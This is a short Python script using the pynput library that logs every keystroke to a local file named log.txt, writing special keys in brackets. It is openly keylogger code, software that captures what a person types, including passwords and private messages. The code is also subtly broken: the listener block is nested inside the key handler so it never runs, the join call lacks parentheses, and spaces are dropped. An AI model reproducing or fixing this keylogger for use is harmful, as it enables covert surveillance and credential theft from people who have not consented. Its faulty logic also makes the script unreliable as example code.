from pynput.keyboard import Key, Listener

log_file = "log.txt"

def on_press(key):
  try:
    with open(log_file, "a") as f:
      f.write(str(key.char))
  
  except AttributeError:
    with open(log_file, "a") as f:
      if key==Key.space:
        f.write("")
      elif key==Key.enter:
        f.write("\n")
      else:
        f.write(f"[{str(key)}] ")
  with Listener(on_press=on_press) as listener:
    listener.join
